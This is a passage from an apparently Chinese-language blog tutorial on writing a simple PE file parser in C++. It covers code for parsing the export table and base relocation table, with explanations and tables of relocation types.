cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_export_directory</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br><span class="hljs-keyword">if</span> (!export_dir_table_size || !export_dir_table_rva) <span class="hljs-keyword">return</span>;<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(export_dir_table_rva), SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(&amp;export_dir_table, <span class="hljs-built_in">sizeof</span>(___IMAGE_EXPORT_DIRECTORY), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// 其他操作就让print函数去完成:))</span><br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_export_table_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br>DWORD name_offset, name_size, i;<br>DWORD* name_p_table, *export_address_table;<br>WORD* ord_table;<br><span class="hljs-type">char</span> *name_tmp, ch;<br>PEXPORT_ENTRY export_entries;<br><br><span class="hljs-keyword">if</span> (!export_dir_table_size || !export_dir_table_rva) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"====No export table===\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><span class="hljs-keyword">return</span>;<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"======Export table====\n\n"</span>);<br><br><span class="hljs-comment">// 先解析导出目录表</span><br><span class="hljs-comment">// 1. 先解析导出表名称</span><br>name_offset = <span class="hljs-built_in">va_to_raw</span>(export_dir_table.Name);<br><span class="hljs-built_in">fseek</span>(pe_fp, name_offset, SEEK_SET);<br><br>name_size = <span class="hljs-number">0</span>;<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br><span class="hljs-keyword">while</span> (ch != EOF &amp;&amp; ch != <span class="hljs-number">0</span>) {<br><span class="hljs-keyword">if</span> (++name_size &gt; <span class="hljs-number">256</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: DLL's name too long?!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br>}<br><br>name_tmp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(name_size + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[name_size] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fseek</span>(pe_fp, name_offset, SEEK_SET);<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), name_size, pe_fp);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Name: %s (raw offset: 0x%X)\n"</span>, name_tmp, name_offset);<br><span class="hljs-built_in">free</span>(name_tmp);<br><br><span class="hljs-comment">// 2.解析各个导出项</span><br><span class="hljs-comment">// 先构造自定义的实体</span><br><br><span class="hljs-keyword">if</span> (export_dir_table.NumberOfFunctions &lt; export_dir_table.NumberOfNames) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Seriously?! Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-keyword">if</span> (export_dir_table.NumberOfFunctions &gt; <span class="hljs-number">0xFFFF</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Too many functions exported (&gt;65535).\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>export_entries = (PEXPORT_ENTRY)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(EXPORT_ENTRY) * export_dir_table.NumberOfFunctions);<br><br><span class="hljs-comment">// 解析导出地址表</span><br>export_address_table = (DWORD*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(DWORD) * export_dir_table.NumberOfFunctions);<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(export_dir_table.AddressOfFunctions), SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(export_address_table, <span class="hljs-built_in">sizeof</span>(DWORD), export_dir_table.NumberOfFunctions, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size ^ export_dir_table.NumberOfFunctions) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; export_dir_table.NumberOfFunctions; i++) {<br>export_entries[i].ordinal = export_dir_table.Base + i;<br>export_entries[i].function_rva = export_address_table[i];<br>export_entries[i].name_rva = <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-built_in">free</span>(export_address_table);<br><br><span class="hljs-comment">// 解析名称指针表和序号表</span><br><br>name_p_table = (DWORD*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(DWORD) * export_dir_table.NumberOfNames);<br>ord_table = (WORD*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(WORD) * export_dir_table.NumberOfNames);<br><br><span class="hljs-keyword">if</span> (!name_p_table || !ord_table) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_p_table or ord_table malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(export_dir_table.AddressOfNames), SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(name_p_table, <span class="hljs-built_in">sizeof</span>(DWORD), export_dir_table.NumberOfNames, pe_fp);<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(export_dir_table.AddressOfNameOrdinals), SEEK_SET);<br>read_size ^= <span class="hljs-built_in">fread</span>(ord_table, <span class="hljs-built_in">sizeof</span>(WORD), export_dir_table.NumberOfNames, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; export_dir_table.NumberOfNames; i++) {<br><br>WORD offset = *(WORD*)(ord_table + i);<br><br><span class="hljs-keyword">if</span> (offset &gt; export_dir_table.NumberOfFunctions) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>export_entries[offset].name_rva = *(DWORD*)(name_p_table + i);<br>name_offset = <span class="hljs-built_in">va_to_raw</span>(*(DWORD*)(name_p_table + i));<br><span class="hljs-built_in">fseek</span>(pe_fp, name_offset, SEEK_SET);<br><br>name_size = <span class="hljs-number">0</span>;<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br><span class="hljs-keyword">while</span> (ch != EOF &amp;&amp; ch != <span class="hljs-number">0</span>) {<br><span class="hljs-keyword">if</span> (++name_size &gt; <span class="hljs-number">99</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Function's name too long?!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br>}<br><br>name_tmp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(name_size + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[name_size] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fseek</span>(pe_fp, name_offset, SEEK_SET);<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), name_size, pe_fp);<br><br><span class="hljs-built_in">memcpy</span>(export_entries[offset].name, name_tmp, name_size + <span class="hljs-number">1</span>);<br><span class="hljs-built_in">free</span>(name_tmp);<br><br>}<br><br><span class="hljs-built_in">free</span>(name_p_table);<br><span class="hljs-built_in">free</span>(ord_table);<br><br><span class="hljs-comment">// 打印</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Export Entries:\n\n"</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; export_dir_table.NumberOfFunctions; i++) {<br><br><span class="hljs-keyword">if</span> (!export_entries[i].function_rva)<br><span class="hljs-built_in">memcpy</span>(export_entries[i].name, <span class="hljs-string">"-"</span>, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">else</span><br>export_entries[i].name[<span class="hljs-number">99</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 防止越界读</span><br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    [%02d] Ordinal: %d\n"</span><br><span class="hljs-string">"           Function RVA: 0x%X\n"</span><br><span class="hljs-string">"           Name: %s (RVA: 0x%X)\n\n"</span>,<br>i + <span class="hljs-number">1</span>, export_entries[i].ordinal, export_entries[i].function_rva, <br>export_entries[i].name, export_entries[i].name_rva);<br>}<br><br><br><span class="hljs-built_in">free</span>(export_entries);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>运行结果：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/13.png"></p><h3 id="Step-3-3-解析重定位表（-reloc）"><a href="#Step-3-3-解析重定位表（-reloc）" class="headerlink" title="Step 3.3: 解析重定位表（.reloc）"></a>Step 3.3: 解析重定位表（.reloc）</h3><ul><li><p>需要重定位表的原因[7]：</p><ul><li><p>在PE程序载入到内存中时，PE Loader会优先按照<code>ImageBase</code>（该PE文件渴望的虚拟基地址），但就和人生一样，有时候你想要得到的不一定就能够得到，所以当该<code>ImageBase</code>的地址被占用的时候，该PE程序就不能加载到<code>ImageBase</code>的虚拟地址</p></li><li><p><code>.text</code>汇编码中包含有一些字符串地址、函数调用地址等，而这些地址都是由编译器根据<code>ImageBase</code>预先确定好的，如果PE不能加载到<code>ImageBase</code>所指向的虚拟地址时，上述这些地址均需要做修正（i.e. fix up）。</p><p><span class="github-emoji"><span>🌰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 举个例子：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">// 需要重定位的值013EBC98h、013ED49Ch和013E1064h<br>printf("Helloworld %s", "hahaha");<br>013E64B2 68 98 BC 3E 01       push        offset string "hahaha" (013EBC98h) <br>013E64B7 68 9C D4 3E 01       push        offset string "Helloworld %s" (013ED49Ch) <br>013E64BC E8 A3 AB FF FF       call        _printf (013E1064h) <br>013E64C1 83 C4 08             add         esp,8<br></code></pre></td></tr></tbody></table></figure></li></ul></li><li><p>重定位表的作用[15]：</p><ul><li>修复地址（仅当<code>ImageBase</code>地址无法满足时）<ul><li>如何修复？<code>fix_up_value = origin_value - ImageBase + new_virtual_address_base</code></li></ul></li></ul><p><span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 强烈建议阅读[15]这一篇文章，很详细介绍了重定位表的作用！</p></li><li><p>PE Section中重定位块[16]</p><ul><li>基址重定位块</li><li>基址重定位类型</li></ul></li></ul><hr><p><strong>1. 基址重定位块</strong></p><ul><li><p>重定位表</p></li><li><p>布局：</p></li></ul><table><thead><tr><th>偏移</th><th>大小</th><th>字段</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>4</td><td>页RVA</td><td>映像基址和页 RVA 将添加到每个偏移量，以创建必须应用基址重定位的 VA。</td></tr><tr><td>4</td><td>4</td><td>块大小</td><td>映像基址和页 RVA 将添加到每个偏移量，以创建必须应用基址重定位的 VA。</td></tr><tr><td>4</td><td>2</td><td>条目1</td><td>高4位为类型，剩余12位相较于页RVA的偏移量</td></tr><tr><td>6</td><td>8</td><td>条目2</td><td></td></tr><tr><td>…</td><td>…</td><td>…</td><td></td></tr></tbody></table><p><strong>2.基址重定位类型</strong></p><table><thead><tr><th align="left">常数</th><th align="left">Value</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">IMAGE_REL_BASED_ABSOLUTE</td><td align="left">0</td><td align="left">跳过基址重定位。 此类型可用于填充块。</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGH</td><td align="left">1</td><td align="left">基址重定位会将差值的高 16 位添加到偏移量的 16 位字段。 16 位字段表示 32 位字的高值。</td></tr><tr><td align="left">IMAGE_REL_BASED_LOW</td><td align="left">2</td><td align="left">基址重定位会将差值的低 16 位添加到偏移量为 16 位字段。 16 位字段表示 32 位字的低半部分。</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGHLOW</td><td align="left">3</td><td align="left">基址重定位会将差值的所有 32 位应用到偏移量的 32 位字段。</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGHADJ</td><td align="left">4</td><td align="left">基址重定位会将差值的高 16 位添加到偏移量的 16 位字段。 16 位字段表示 32 位字的高值。 32 位值的低 16 位存储在此基址重定位后的 16 位字中。 这意味着此基址重定位占用两个槽位。</td></tr><tr><td align="left">IMAGE_REL_BASED_MIPS_JMPADDR</td><td align="left">5</td><td align="left">重定位解释取决于计算机类型。 当计算机类型为 MIPS 时，则基址重定位适用于 MIPS 跳转指令。</td></tr><tr><td align="left">IMAGE_REL_BASED_ARM_MOV32</td><td align="left">5</td><td align="left">仅当计算机类型为 ARM 或 Thumb 时，此重定位才有意义。 基址重定位跨连续的 MOVW/MOVT 指令对应用符号的 32 位地址。</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_HIGH20</td><td align="left">5</td><td align="left">仅当计算机类型为 RISC-V 时，此重定位才有意义。 基址重定位适用于 32 位绝对地址的高 20 位。</td></tr><tr><td align="left"></td><td align="left">6</td><td align="left">保留，必须为 0。</td></tr><tr><td align="left">IMAGE_REL_BASED_THUMB_MOV32</td><td align="left">7</td><td align="left">仅当计算机类型为 Thumb 时，此重定位才有意义。 基址重定位将符号的 32 位地址应用于连续的 MOVW/MOVT 指令对。</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_LOW12I</td><td align="left">7</td><td align="left">仅当计算机类型为 RISC-V 时，此重定位才有意义。 基址重定位适用于以 RISC-V I 型指令格式形成的 32 位绝对地址的低 12 位。</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_LOW12S</td><td align="left">8</td><td align="left">仅当计算机类型为 RISC-V 时，此重定位才有意义。 基址重定位适用于以 RISC-V S 型指令格式形成的 32 位绝对地址的低 12 位。</td></tr><tr><td align="left">IMAGE_REL_BASED_LOONGARCH32_MARK_LA</td><td align="left">8</td><td align="left">仅当计算机类型为 LoongArch 32 位时，此重定位才有意义。 基址重定位适用于由两个连续指令形成的 32 位绝对地址。</td></tr><tr><td align="left">IMAGE_REL_BASED_LOONGARCH64_MARK_LA</td><td align="left">8</td><td align="left">仅当计算机类型为 LoongArch 64 位时，此重定位才有意义。 基址重定位适用于由四个连续指令形成的 64 位绝对地址。</td></tr><tr><td align="left">IMAGE_REL_BASED_MIPS_JMPADDR16</td><td align="left">9</td><td align="left">仅当计算机类型为 MIPS 时，此重定位才有意义。 基址重定位适用于 MIPS16 跳转指令。</td></tr><tr><td align="left">IMAGE_REL_BASED_DIR64</td><td align="left">10</td><td align="left">基址重定位会将差值应用到偏移量的 64 位字段。</td></tr></tbody></table><hr><ul><li><p>解析流程：</p><ul><li>首先，根据<code>NT Header - Optional Header - Data Directory</code>中的<code>Base Relocation Table</code>字段的RVA值，找到重定向表的位置</li><li>然后，根据基址重定位块的布局结构，依次解析相应的内容</li><li>最后，打印相应的内容即可</li></ul></li><li><p>处理代码：</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_basereloc_table</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br>DWORD basereloc_offset, basereloc_entry_num, i;<br><span class="hljs-type">int</span> left_size;<br>___IMAGE_BASE_RELOCATION tmp;<br><br><span class="hljs-keyword">if</span> (!basereloc_dir_table_rva || !basereloc_dir_table_size) <span class="hljs-keyword">return</span>;<br><br>basereloc_offset = <span class="hljs-built_in">va_to_raw</span>(basereloc_dir_table_rva);<br><span class="hljs-built_in">fseek</span>(pe_fp, basereloc_offset, SEEK_SET);<br>left_size = basereloc_dir_table_size;<br>basereloc_entry_num = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br><br>read_size = <span class="hljs-built_in">fread</span>(&amp;tmp, <span class="hljs-built_in">sizeof</span>(___IMAGE_BASE_RELOCATION), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-keyword">if</span> (!tmp.VirtualAddress &amp;&amp; !tmp.SizeOfBlock) <span class="hljs-keyword">break</span>;<br><br>basereloc_entry_num++;<br>left_size -= tmp.SizeOfBlock;<br><span class="hljs-keyword">if</span> (left_size &lt; <span class="hljs-number">0</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Out of base relocation table's size. Maybe Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>basereloc_offset += tmp.SizeOfBlock;<br><span class="hljs-built_in">fseek</span>(pe_fp, basereloc_offset, SEEK_SET);<br><br>}<br><br><span class="hljs-keyword">if</span> (basereloc_entry_num &gt; <span class="hljs-number">0xFFFFFF</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Too many base relocation entries!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>basereloc_table_num = basereloc_entry_num;<br><br>basereloc_table =<br>(___PIMAGE_BASE_RELOCATION)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(___IMAGE_BASE_RELOCATION) * basereloc_entry_num);<br><span class="hljs-keyword">if</span> (!basereloc_table) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Basereloc_table malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>basereloc_offset = <span class="hljs-built_in">va_to_raw</span>(basereloc_dir_table_rva);<br><span class="hljs-built_in">fseek</span>(pe_fp, basereloc_offset, SEEK_SET);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; basereloc_entry_num; i++) {<br><span class="hljs-built_in">fread</span>(&amp;basereloc_table[i], <span class="hljs-built_in">sizeof</span>(___IMAGE_BASE_RELOCATION), <span class="hljs-number">1</span>, pe_fp);<br>basereloc_offset += basereloc_table[i].SizeOfBlock;<br><span class="hljs-built_in">fseek</span>(pe_fp, basereloc_offset, SEEK_SET);<br>}<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_basereloc_table_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>DWORD i, j, basereloc_offset, block_entries_num;<br>WORD  value;<br><span class="hljs-keyword">if</span> (!basereloc_dir_table_rva || !basereloc_dir_table_size) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"===No base relocation table===\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><span class="hljs-keyword">return</span>;<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"===Base relocation table===\n\n"</span>);<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(basereloc_dir_table_rva), SEEK_SET);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; basereloc_table_num; i++) {<br><br>block_entries_num = (basereloc_table[i].SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"  * Block %02d:\n\n"</span>, i + <span class="hljs-number">1</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Page RVA: 0x%X\n"</span>, basereloc_table[i].VirtualAddress);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Block Size: 0x%X\n"</span>, basereloc_table[i].SizeOfBlock);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Entries [total %d]:\n\n"</span>, block_entries_num);<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-number">8</span>, SEEK_CUR);<br><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; block_entries_num; j++) {<br><span class="hljs-comment">// 请注意，fread遇到0x1A (ctrl-Z) 终止，读入文件需要以二进制的形式打开</span><br><span class="hljs-built_in">fread</span>(&amp;value, <span class="hljs-built_in">sizeof</span>(WORD), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       [%03d] Value: 0x%04X\n"</span>, j+<span class="hljs-number">1</span>, value);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"             Type : %s\n"</span>, <span class="hljs-built_in">translate_block_entry_types</span>((value &amp; <span class="hljs-number">0xf000</span>) &gt;&gt; <span class="hljs-number">12</span>, nt_headers_machine));<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"  Offset from Page: 